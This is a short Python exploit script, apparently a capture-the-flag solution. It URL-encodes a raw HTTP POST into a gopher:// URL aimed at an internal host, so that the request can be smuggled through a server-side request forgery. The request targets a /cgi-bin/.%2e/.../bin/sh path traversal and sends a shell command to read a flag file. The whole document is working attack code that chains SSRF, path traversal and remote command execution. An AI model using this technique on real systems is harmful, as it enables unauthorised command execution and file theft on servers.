import urllib
import requests

payload = "echo;cat /flag_y0u_f1nd_1t"

exp='''POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 172.18.0.3
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}'''.format(len(payload), payload)
# print exp.split("\n")
tmp = urllib.parse.quote(exp)
tmp = tmp.replace("%0A","%0D%0A")
 
result = "_"+urllib.parse.quote(tmp)

result="gopher://172.18.0.3:80/"+result
print(result)
